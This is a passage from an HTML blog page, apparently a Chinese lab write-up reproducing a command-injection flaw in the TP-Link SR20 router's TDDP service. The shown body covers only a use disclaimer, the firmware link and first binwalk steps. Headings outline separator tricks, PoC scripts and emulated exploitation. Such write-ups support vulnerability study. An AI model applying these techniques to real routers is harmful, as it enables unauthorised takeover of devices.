@@ -1,0 +1,837 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme-mode="auto">
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://aixiadaogudexibao.github.io';window.REIMU_CONFIG.relative = '/';window.REIMU_CONFIG.dark_mode = {"button":true,"mode":"auto"};</script>
+  <title>
+    TP-Link SR20 TDDP 漏洞案例复现 | 爱瞎捣鼓的xibao
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="免责声明与说明 免责声明 本文仅用于 网络安全学习、固件分析与漏洞原理研究，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权设备、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规与厂商授权范围。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分协议梳理、脚本辅助、文字润色与">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP-Link SR20 TDDP 漏洞案例复现">
+<meta property="og:url" content="https://aixiadaogudexibao.github.io/2026/10/09/newpapername/index.html">
+<meta property="og:site_name" content="爱瞎捣鼓的xibao">
+<meta property="og:description" content="免责声明与说明 免责声明 本文仅用于 网络安全学习、固件分析与漏洞原理研究，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权设备、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规与厂商授权范围。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分协议梳理、脚本辅助、文字润色与">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928192933.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928193221.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928194111.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928194325.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928194352.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928194904.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928195140.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928201316.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928201346.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928201825.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260930132740.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260930132924.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260930195139.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001142314.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260930200032.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001141507.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001141914.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001143201.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001143307.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001145348.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001155342.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001160626.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001161149.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001161518.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001161630.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001161741.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001161705.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261001162700.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261004212809.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261004212931.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261004212951.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261004213033.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261005201028.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261005202146.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261005202416.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261005204350.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20261005204350.png">
+<meta property="article:published_time" content="2026-10-09T09:29:19.000Z">
+<meta property="article:modified_time" content="2026-10-09T11:19:19.322Z">
+<meta property="article:author" content="爱瞎捣鼓的xibao">
+<meta property="article:tag" content="IoT">
+<meta property="article:tag" content="TDDP">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aixiadaogudexibao.github.io/images/newpapername/Pasted-image-20260928192933.png">
+    <link rel="alternate" href="/atom.xml" title="爱瞎捣鼓的xibao" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.3/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <style id="site-bg-custom">
+  /*
+    Single full-site background only.
+    Reimu also puts the same banner image in #header > img (height 180% + mask).
+    Scrolling that header img over a fixed body bg causes ghost/overlap.
+    Fix: hide header banner img; keep one fixed body layer.
+  */
+  html {
+    background-color: #070b16;
+  }
+  body {
+    background-color: #070b16 !important;
+    background-image: url("/images/site-bg.webp") !important;
+    background-size: cover !important;
+    background-position: center center !important;
+    background-repeat: no-repeat !important;
+    background-attachment: fixed !important;
+  }
+  :root {
+    --color-background: transparent !important;
+    --color-default: #475569 !important;          /* slate-600 grey text */
+    --color-wrap: rgba(248, 250, 252, 0.92) !important; /* grey-white cards */
+    --color-header-background: rgba(248, 250, 252, 0.88) !important;
+    --color-footer-background: rgba(241, 245, 249, 0.92) !important;
+    --color-mobile-nav-background: #f8fafc !important;
+    --color-code-background: #f1f5f9 !important;
+    --color-h2-border: #e2e8f0 !important;
+    --color-hover-shadow: rgba(14, 165, 233, 0.12) !important;
+    --grey-9: #64748b !important;
+  }
+  [data-theme="dark"] {
+    --color-background: transparent !important;
+    --color-default: #cbd5e1 !important;          /* slate-300 */
+    --color-wrap: rgba(30, 41, 59, 0.88) !important; /* slate-800 glass */
+    --color-header-background: rgba(15, 23, 42, 0.9) !important;
+    --color-footer-background: rgba(15, 23, 42, 0.92) !important;
+    --color-mobile-nav-background: #0f172a !important;
+    --color-code-background: rgba(148, 163, 184, 0.12) !important;
+    --color-h2-border: #334155 !important;
+    --color-hover-shadow: rgba(56, 189, 248, 0.18) !important;
+    --grey-9: #94a3b8 !important;
+  }
+  /* kill duplicate banner layer */
+  #header > img,
+  #header > picture,
+  #header > picture img {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+  }
+  /* keep header height; soft top gradient so site title stays readable */
+  #header {
+    background: linear-gradient(
+      to bottom,
+      rgba(7, 11, 22, 0.15) 0%,
+      rgba(7, 11, 22, 0.05) 40%,
+      rgba(7, 11, 22, 0.35) 100%
+    ) !important;
+    isolation: isolate;
+  }
+  @media (max-width: 768px) {
+    body {
+      background-attachment: scroll !important;
+    }
+  }
+  /* Alice pixel cursors with hotspots (48px art) */
+  :root {
+    --cursor-default: url("/images/cursor/alice-cursor-default.png") 2 2, auto !important;
+    --cursor-pointer: url("/images/cursor/alice-cursor-pointer.png") 6 2, pointer !important;
+    --cursor-text: url("/images/cursor/alice-cursor-text.png") 4 12, text !important;
+  }
+</style>
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/newpapername/Pasted-image-20260928192933.png" alt="TP-Link SR20 TDDP 漏洞案例复现">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">TP-Link SR20 TDDP 漏洞案例复现</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">免责声明与说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%B8%8B%E8%BD%BD%E5%9B%BA%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">1.下载固件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8F%96%E5%87%BArootfs"><span class="toc-number">3.</span> <span class="toc-text">2.取出rootfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E5%85%88file-%E4%B8%80%E4%B8%8B%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">a.先file 一下文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-binwalk-%E4%B8%80%E4%B8%8B%EF%BC%8C"><span class="toc-number">3.2.</span> <span class="toc-text">b.binwalk  一下，</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-dd%E5%BE%97%E5%88%B0%E9%95%9C%E5%83%8F"><span class="toc-number">3.3.</span> <span class="toc-text">c.dd得到镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E5%BE%97%E5%88%B0rootfs%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">d.得到rootfs文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.</span> <span class="toc-text">3.找到漏洞程序</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%9F%A5%E7%9C%8B%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">4.1.</span> <span class="toc-text">a.查看开机启动项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E4%B8%80%E9%83%A8%E5%88%86%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">4.一部分前置知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">a.本漏洞在干什么（一句话）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E5%8D%8F%E8%AE%AE%E5%A4%B4%EF%BC%88v1%EF%BC%8C12-%E5%AD%97%E8%8A%82%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">b.协议头（v1，12 字节）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E7%AB%AF%E5%8F%A3%E4%B8%8E%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.3.</span> <span class="toc-text">c.端口与程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E4%B8%BA%E4%BB%80%E4%B9%88-%E4%B8%8D%E8%A1%8C%E3%80%81-%E8%A1%8C"><span class="toc-number">5.4.</span> <span class="toc-text">d.为什么 ; 不行、&amp;&#x2F;| 行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-%E4%B8%A4%E5%A5%97%E5%A4%8D%E7%8E%B0%E8%B7%AF%E5%BE%84"><span class="toc-number">5.5.</span> <span class="toc-text">e.两套复现路径</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">5.查找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%EF%BC%88%E4%BE%BF%E4%BA%8E%E5%9B%9E%E7%9C%8B%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">调用链（便于回看）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">7.</span> <span class="toc-text">6.脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%80%9D%E8%B7%AF"><span class="toc-number">7.1.</span> <span class="toc-text">a.思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E8%84%9A%E6%9C%AC"><span class="toc-number">7.2.</span> <span class="toc-text">b.脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-AI-%E5%86%99%E7%9A%84%E5%AE%8C%E6%95%B4-helper%EF%BC%88%E6%8E%A8%E8%8D%90%E6%97%A5%E5%B8%B8%EF%BC%89"><span class="toc-number">7.2.1.</span> <span class="toc-text">方案 A · AI 写的完整 helper（推荐日常）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-%E8%87%AA%E5%B7%B1%E5%AF%B9%E7%85%A7%E5%86%99%E7%9A%84%E6%9E%81%E7%AE%80%E7%89%88"><span class="toc-number">7.2.2.</span> <span class="toc-text">方案 B · 自己对照写的极简版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E8%B0%83%E7%94%A8%EF%BC%88%E4%B8%8E%E4%B8%8A%E8%8A%82%E6%96%B9%E6%A1%88%E5%AF%B9%E5%BA%94%EF%BC%9B%E6%89%93%E6%B3%95%E8%A7%81-%C2%A78%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">c.调用（与上节方案对应；打法见 §8）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%88ARM64-%E8%B0%83%E8%AF%95%E6%9C%BA%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">7.环境配置与传文件（ARM64 调试机）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E4%B8%BB%E6%9C%BA%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%EF%BC%88debvm-%E7%AD%89%EF%BC%89"><span class="toc-number">8.1.</span> <span class="toc-text">a.主机工具安装（debvm 等）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E5%87%86%E5%A4%87%E8%B5%84%E4%BA%A7%EF%BC%88%E4%B8%BB%E6%9C%BA%E6%A1%8C%E9%9D%A2%EF%BC%89"><span class="toc-number">8.2.</span> <span class="toc-text">b.准备资产（主机桌面）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E5%BC%80%E6%9C%BA"><span class="toc-number">8.3.</span> <span class="toc-text">c.开机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E5%AE%A2%E6%9C%BA%E4%B8%80%E6%AC%A1%E9%85%8D%E7%BD%AE%EF%BC%88%E5%86%99%E5%85%A5%E7%A3%81%E7%9B%98%EF%BC%8C%E4%B8%8B%E6%AC%A1%E8%BF%98%E5%9C%A8%EF%BC%89"><span class="toc-number">8.4.</span> <span class="toc-text">d.客机一次配置（写入磁盘，下次还在）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%88%E4%BA%8C%E9%80%89%E4%B8%80%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%85%88%E5%90%8E%EF%BC%89"><span class="toc-number">8.5.</span> <span class="toc-text">e.传文件（二选一，不是先后）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-scp%EF%BC%88SSH-%E5%B7%B2%E9%80%9A%E6%97%B6%EF%BC%89"><span class="toc-number">8.5.1.</span> <span class="toc-text">方案 A · scp（SSH 已通时）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-HTTP%EF%BC%88SSH-%E8%BF%98%E6%B2%A1%E5%A5%BD%E6%97%B6%EF%BC%89"><span class="toc-number">8.5.2.</span> <span class="toc-text">方案 B · HTTP（SSH 还没好时）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f-%E8%A7%A3%E5%8C%85"><span class="toc-number">8.6.</span> <span class="toc-text">f.解包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%88qemu-user%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">8.本地复现（qemu-user）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E8%B5%B7%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%BF%85%E9%A1%BB%E5%9C%A8-rootfs-%E9%87%8C%EF%BC%89"><span class="toc-number">9.1.</span> <span class="toc-text">a.起服务（必须在 rootfs 里）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E6%89%93-PoC"><span class="toc-number">9.2.</span> <span class="toc-text">b.打 PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-%E5%AE%A2%E6%9C%BA%E6%9C%AC%E6%9C%BA%E6%89%93%EF%BC%88%E6%9C%80%E7%9C%81%E4%BA%8B%EF%BC%89"><span class="toc-number">9.2.1.</span> <span class="toc-text">方案 A · 客机本机打（最省事）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-%E4%B8%BB%E6%9C%BA%E5%8F%91%E5%8C%85-%E5%AE%A2%E6%9C%BA%E8%A7%A6%E5%8F%91"><span class="toc-number">9.2.2.</span> <span class="toc-text">方案 B · 主机发包 &#x2F; 客机触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E9%80%89"><span class="toc-number">9.2.3.</span> <span class="toc-text">怎么选</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E6%88%90%E5%8A%9F%E5%88%A4%E6%8D%AE%EF%BC%88%E4%B8%A4%E6%96%B9%E6%A1%88%E7%9B%B8%E5%90%8C%EF%BC%89"><span class="toc-number">9.3.</span> <span class="toc-text">c.成功判据（两方案相同）</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="爱瞎捣鼓的xibao" class="lazyload">
+  <div class="sidebar-author-name">爱瞎捣鼓的xibao</div>
+  <div class="sidebar-description">笔记与漏洞复现</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-newpapername" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-10-09T09:29:19.000Z" itemprop="datePublished">2026-10-09</time>
+    <time style="display: none;" id="post-update-time">2026-10-09</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h2 id="免责声明与说明"><a href="#免责声明与说明" class="headerlink" title="免责声明与说明"></a>免责声明与说明</h2><blockquote>
+<p><strong>免责声明</strong></p>
+<p>本文仅用于 <strong>网络安全学习、固件分析与漏洞原理研究</strong>，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。<br><strong>禁止</strong>将文中方法、脚本用于未授权设备、生产网络或任何违法用途。<br>若因滥用本文内容造成损失或法律后果，作者与转载平台 <strong>不承担任何责任</strong>；读者应自行遵守所在地法律法规与厂商授权范围。</p>
+</blockquote>
+<blockquote>
+<p><strong>关于 AI 辅助</strong></p>
+<p>本文主体为作者实操复现与笔记整理；其中 <strong>部分协议梳理、脚本辅助、文字润色与结构归纳由 AI 生成&#x2F;协助完成</strong>，并经作者核对后收录。<br>代码、命令与截图请以可复现环境中的实际结果为准；如有错漏，欢迎指正。</p>
+</blockquote>
+<hr>
+<h1 id="1-下载固件"><a href="#1-下载固件" class="headerlink" title="1.下载固件"></a>1.下载固件</h1><p><a target="_blank" rel="noopener" href="https://static.tp-link.com/2018/201806/20180611/SR20(US)_V1_180518.zip">https://static.tp-link.com/2018/201806/20180611/SR20(US)_V1_180518.zip</a></p>
+<h1 id="2-取出rootfs"><a href="#2-取出rootfs" class="headerlink" title="2.取出rootfs"></a>2.取出rootfs</h1><h2 id="a-先file-一下文件"><a href="#a-先file-一下文件" class="headerlink" title="a.先file 一下文件"></a>a.先file 一下文件</h2><p>bash:<br>file   ”文件“</p>
+<p><img src="/images/newpapername/Pasted-image-20260928192933.png" alt="Pasted image 20260928192933"><br>他好像就已经是bin</p>
+<h2 id="b-binwalk-一下，"><a href="#b-binwalk-一下，" class="headerlink" title="b.binwalk  一下，"></a>b.binwalk  一下，</h2><p>看看结构<br><img src="/images/newpapername/Pasted-image-20260928193221.png" alt="Pasted image 20260928193221"></p>
+<p>bash:<br>binwalk “文件”</p>
+<p>我们需要的是Squashfs filesystem的偏移，如图2174969</p>
+<p><mark>发现文件名有点长改个名字  xi.bin</mark></p>
